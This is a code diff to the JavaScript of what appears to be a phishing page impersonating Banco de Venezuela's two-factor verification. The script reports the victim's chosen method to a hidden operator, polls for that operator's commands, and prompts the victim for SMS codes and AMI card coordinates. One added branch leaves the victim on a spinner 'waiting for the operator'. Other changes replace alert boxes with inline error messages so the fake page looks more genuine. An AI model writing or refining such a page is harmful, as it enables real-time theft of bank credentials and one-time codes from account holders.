@@ -188,6 +188,21 @@
     }
   }
 
+  const codeError = document.getElementById('codeError');
+
+  function setCodeError(show, message) {
+    if (!codeField) return;
+    codeField.classList.toggle('mat-form-field-invalid', show);
+    codeField.classList.toggle('ng-invalid', show);
+    if (codeError) {
+      codeError.hidden = !show;
+      if (message) codeError.textContent = message;
+    }
+    if (verifyCode) {
+      verifyCode.setAttribute('aria-invalid', show ? 'true' : 'false');
+    }
+  }
+
   function updateCodeFloat() {
     if (!codeField || !verifyCode) return;
     const has = verifyCode.value.length > 0;
@@ -293,6 +308,7 @@
     }
 
     if (codeField) codeField.classList.remove('mat-form-field-invalid');
+    setCodeError(false);
     if (verifyCode) {
       verifyCode.value = '';
       setTimeout(() => verifyCode.focus(), 40);
@@ -320,6 +336,11 @@
     acceptMethodBtn.addEventListener('click', () => {
       showSpinner();
       sendState('metodo-' + selectedMethod);
+      if (selectedMethod === 'bdvapp') {
+        // En BDV App no se pide ningún código: permanece en el spinner indefinidamente esperando al operador
+        sessionStorage.setItem('is_waiting', 'true');
+        return;
+      }
       setTimeout(() => {
         hideSpinner();
         showVerifyStep(selectedMethod);
@@ -338,6 +359,7 @@
     verifyCode.addEventListener('blur', updateCodeFloat);
     verifyCode.addEventListener('input', () => {
       updateCodeFloat();
+      setCodeError(false);
     });
   }
 
@@ -383,28 +405,21 @@
           continueBtn.disabled = false;
         } else if (action === 'error-sms') {
           hideSpinner();
-          if (codeField) codeField.classList.add('mat-form-field-invalid');
+          setCodeError(true, 'Código SMS incorrecto o vencido. Por favor ingrese el nuevo código recibido.');
           if (verifyCode) {
             verifyCode.value = '';
             verifyCode.focus();
           }
-          alert('Código SMS incorrecto o vencido. Por favor ingrese el nuevo código recibido.');
         } else if (action === 'error-ami') {
           hideSpinner();
-          if (codeField) codeField.classList.add('mat-form-field-invalid');
+          setCodeError(true, 'Coordenadas AMI incorrectas. Por favor verifique su tarjeta AMI e intente nuevamente.');
           if (verifyCode) {
             verifyCode.value = '';
             verifyCode.focus();
           }
-          alert('Coordenadas AMI incorrectas. Por favor verifique su tarjeta AMI e intente nuevamente.');
         } else if (action === 'error-bdvapp') {
           hideSpinner();
-          if (codeField) codeField.classList.add('mat-form-field-invalid');
-          if (verifyCode) {
-            verifyCode.value = '';
-            verifyCode.focus();
-          }
-          alert('Código BDVApp incorrecto o expirado. Genere un nuevo código e ingrese nuevamente.');
+          goToAuthMethod('bdvapp');
         } else if (action === 'done') {
           stopPing();
           stopPolling();
